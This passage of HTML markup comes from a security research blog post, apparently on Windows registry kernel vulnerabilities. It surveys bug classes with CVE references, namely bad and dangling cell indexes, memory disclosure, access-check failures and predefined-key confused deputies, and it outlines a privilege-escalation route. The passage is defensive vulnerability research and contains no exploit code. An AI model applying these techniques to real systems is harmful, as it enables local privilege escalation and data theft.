practice.&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Ultimately, none of this matters much, because it seems that Microsoft noticed a trend in these vulnerabilities and, in July 2023, added a special condition to the HvpGetCellFlat and HvpGetCellPaged functions:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;&amp;nbsp; if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;(Index&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;HCELL_NIL)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;KeBugCheckEx(REGISTRY_ERROR,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;0x32&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Hive,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;0xFFFFFFFF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&lt;br&gt; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This basically means that the specific case of index -1 has been completely mitigated&lt;/span&gt;&lt;span&gt;, since r&lt;/span&gt;&lt;span&gt;ather than allowing any chance of exploitation, the system now immediately shuts down with a Blue Screen of Death.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As a result&lt;/span&gt;&lt;span&gt;, the bug class no longer has any security implications&lt;/span&gt;&lt;span&gt;. However, &lt;/span&gt;&lt;span&gt;I do feel a bit disappointed &amp;ndash; if Microsoft deemed the check sufficiently important to add to the code, they could have made it just a tiny bit stronger, for example:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;&amp;nbsp; if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;((Index&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;0x7FFFFFFF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Hive-&amp;gt;Storage[Index&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;].Length)&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;KeBugCheckEx(...);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; }&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The above check would reject all cell indexes exceeding the length of the corresponding storage type, and it is exactly&lt;/span&gt;&lt;span&gt;&amp;nbsp;what the HvpReleaseCellPaged function currently does.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Checking this slightly stronger condition in one fell swoop would handle invalid indexes of -1 and completely mitigate the previously mentioned technique of out-of-bounds cell indexes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;While not introduced yet&lt;/span&gt;&lt;span&gt;, I still secretly hope that it will happen one day... &amp;#128578;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.87pl017hcioc&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Dangling (out-of-date) cell indexes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Another group of vulnerabilities related to cell indexes are cases where, after a cell is freed, its index remains in an active cell within the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Simply put, these are just the cell-specific use-after-free conditions, and so the&lt;/span&gt;&lt;span&gt;&amp;nbsp;category &lt;/span&gt;&lt;span&gt;very closely &lt;/span&gt;&lt;span&gt;overlaps with the previously described hive-based memory corruption.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Notable examples of such bugs include:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_5jrz2mxy905c-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451463&quot;&gt;CVE-2022-37988&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: Caused by the internal HvReallocateCell function potentially failing when shrinking an existing cell, which its caller assumed was impossible.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: A bug in the transactional key rename operation could lead to a dangling cell index in a key&amp;#39;s subkey list, pointing to a freed key node.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451661&quot;&gt;CVE-2024-26182&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: Caused by mishandling a partial success situation where an internal function might successfully perform some operations on the hive (reallocate existing subkey lists) but ultimately return an error code, causing the caller to skip updating the _CM_KEY_NODE.SubKeyLists[...] field accordingly.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;ll use-after-free vulnerabilities in security descriptors due to incorrect reference counting: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451423&quot;&gt;CVE-2022-34707&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451552&quot;&gt;CVE-2023-28248&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451596&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451592&quot;&gt;CVE-2023-35382&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451732&quot;&gt;CVE-2024-43641&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In general, UAF bugs within the hive are powerful primitives that can typically be exploited to achieve total control over the hive&amp;#39;s internal data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The fact that both exploits I wrote to demonstrate practical exploitation of hive memory corruption vulnerabilities fall into this category (CVE-2022-34707, CVE-2023-23420) can serve as anecdotal evidence of this statement.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.yf2iwv67a8se&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Fully controlled/arbitrary cell indexes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The last type of issues where cell indexes play a major role are situations in which the user somehow obtains full control over the entire 32-bit index value, which is then referenced as a valid cell by the kernel. Notably, this is not about some second-order effect of hive memory corruption, but vulnerabilities where this primitive is the root cause of the problem.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Such situations happen relatively rarely, but there have been at least two such cases in the past:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_pipdk6l60rc8-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451425&quot;&gt;CVE-2022-34708&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: missing verification of the _CM_KEY_SECURITY.Blink field in the CmpValidateHiveSecurityDescriptors function for the root security descriptor in the hive,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451588&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: referencing the _CM_KEY_NODE.ValueList.List field in a predefined key, in which the ValueList structure has completely different semantics, and its List field can be set to an arbitrary value.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Given that the correctness of cell indexes is a fairly obvious requirement known to Microsoft kernel developers, they pay close attention to verifying them thoroughly.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For this reason, I think that the chance we will have many more such bugs in the future is slim.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As for their exploitation, they may seem similar in nature to the way hive memory corruption can be exploited with out-of-bounds cell indexes, but in fact, these are two different scenarios. With hive-based memory corruption, we can dynamically change the value of a cell index multiple times as needed, and here, we would only have one specific 32-bit value at our disposal.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If, in a hypothetical vulnerability, some interesting operations were performed on such a controlled index, I would probably &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;still reduce the problem to the typical UAF case, try to obtain full binary control over the hive, and continue from there.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.fy9xjtcnp932&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Low-level information disclosure (memory, pointers)&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Since the registry code is written in C and operates with kernel privileges, and additionally has not yet been completely rewritten to use &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2020/07/solving-uninitialized-kernel-pool-memory-on-windows/&quot;&gt;zeroing ExAllocatePool functions&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it is natural that it may be vulnerable to memory disclosure issues when copying output data to user-mode.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The most canonical example of such a bug was &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451608&quot;&gt;CVE-2023-38140&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the VrpPostEnumerateKey function (one of the sub-handlers of the &lt;/span&gt;&lt;span&gt;VRegDriver &lt;/span&gt;&lt;span&gt;registry callback) allocated a buffer on kernel pools with a user-controlled length, filled it with some amount of data &amp;ndash; potentially less than the buffer size &amp;ndash; and then copied the entire buffer back to user mode, including uninitialized bytes at the end of the allocation.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;However, besides this typical memory disclosure scenario, it is worth noting two more things in the context of the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One of them is that, as we know, the registry operates not only on memory but also on various files on disk, and therefore the filesystem becomes another type of data sink where data leakage can also occur.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;And so, for example, in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451427&quot;&gt;CVE-2022-35768&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, kernel pool memory could be disclosed directly to the hive file due to an out-of-bounds read vulnerability, and in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451559&quot;&gt;CVE-2023-28271&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, both uninitialized data and various kernel-mode pointers were leaked to KTM transaction log files.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The second interesting observation is that the registry implementation does not have to be solely the source of the data leak, but can also be just a medium through which it happens.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;There is a certain group of keys and values that are readable by ordinary users and initialized with binary data by the kernel and drivers using &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwsetvaluekey&quot;&gt;ZwSetValueKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span&gt;similar functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, there is a risk that some uninitialized data may leak through this channel, and indeed during my &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2018/06/detecting-kernel-memory-disclosure.html&quot;&gt;Bochspwn Reloaded&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;research in 2018, I identified several instances of such leaks, such as &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450520&quot;&gt;CVE-2018-0898&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450521&quot;&gt;CVE-2018-0899&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450522&quot;&gt;CVE-2018-0900&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.3y9mv897uawf&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Broken security guarantees, API contracts and common sense assumptions&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Besides maintaining internal consistency and being free of low-level bugs, it&amp;#39;s also important that the registry behaves logically and predictably, even under unusual conditions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;I&lt;/span&gt;&lt;span&gt;t must adhere to the overall security model of Windows NT, operate in accordance with its public documentation, and behave in a way that aligns with common sense expectations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Failure to do so could result in various problems in the client software that interacts with it, but identifying such deviations from expected behavior &lt;/span&gt;&lt;span&gt;can be challenging, as it requires deep understanding of the interface&amp;#39;s high-level principles and the practical implications of violating them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In the following subsections, I will discuss a few examples of issues where the registry&amp;#39;s behavior was inconsistent with documentation, system architecture, or common sense.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.8dym9pmimwab&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Security access rights enforcement&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The registry implementation must enforce security checks, meaning it must verify appropriate access rights to a key when opening it, and then again when performing specific operations on the obtained handle.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Generally, the registry manages this well in most cases.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, there were two bugs in the past that allowed a local user to perform certain operations that they theoretically didn&amp;#39;t have sufficient permissions for:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_2a1s98goatwb-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451516&quot;&gt;CVE-2023-21750&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: Due to a logic bug in the CmKeyBodyRemapToVirtual function (related to registry virtualization), it was possible to delete certain keys within the HKLM\Software hive with only KEY_READ and KEY_SET_VALUE rights, without the normally required DELETE right.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451625&quot;&gt;CVE-2023-36404&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: In this case, it was possible to gain access to the values of certain registry keys despite lacking appropriate rights.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The attack itself was complex and required specific circumstances: loading a differencing hive overlaid on a system hive with a specially crafted key structure, and then having a system component create a secret key in that system hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Because of the fact that the handle to the layered key would be opened earlier (and the security access check would be performed at that point in time), creating a new key at a lower level with more restricted permissions wouldn&amp;#39;t be considered later, leading to potential information disclosure.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As shown, both these bugs were directly related to incorrect or missing permissions verification, but they weren&amp;#39;t particularly attractive in terms of practical attacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A much more appealing bug was &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42450862&quot;&gt;CVE-2019-0881&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, discovered in registry virtualization a few years earlier by James Forshaw.&lt;/span&gt;&lt;span&gt;&amp;nbsp;That&lt;/span&gt;&lt;span&gt;&amp;nbsp;vulnerability allowed unprivileged users to read every registry value in the system regardless of the user&amp;#39;s privileges, which is about as powerful as a registry infoleak can get.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.efveoxv5sh2d&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Confused deputy problems with predefined keys&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Predefined keys &lt;/span&gt;&lt;span&gt;probably don&amp;#39;t need any further introduction at this point in the series&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;In this specific case of the confused deputy problem, t&lt;/span&gt;&lt;span&gt;he bug report for &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451640&quot;&gt;CVE-2023-35633&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;captures the essence of the issue well: if a local attacker had binary control over a hive, they could cause the use of an API like &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexw&quot;&gt;RegOpenKeyExW&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;on any key within that hive to return one of the predefined pseudo-handles like HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, etc., instead of a normal handle to that key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This behavior was undocumented and unexpected for developers using registry in their code.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Unsurprisingly, finding a privileged process that did something interesting on a user-controlled hive wasn&amp;#39;t that hard, and it turned out that there was indeed a service in&lt;/span&gt;&lt;span&gt;&amp;nbsp;Windows &lt;/span&gt;&lt;span&gt;that opened a key inside the HKCU of &lt;/span&gt;&lt;span&gt;each &lt;/span&gt;&lt;span&gt;logged-in user, and recursively set permissive access rights on that key.&lt;/span&gt;&lt;span&gt;&amp;nbsp;By abusing&lt;/span&gt;&lt;span&gt;&amp;nbsp;predefined handles, it was possible to redirect the operation and grant ourselves full access to one of the global keys in the system, leading to a fairly straightforward privilege escalation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If you are interested in learning more about the bug and its practical exploitation, please refer to my &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/talks/confidence-windows-registry-deja-vu-the-return-of-confused-deputies/&quot;&gt;Windows Registry Deja Vu: The Return of Confused 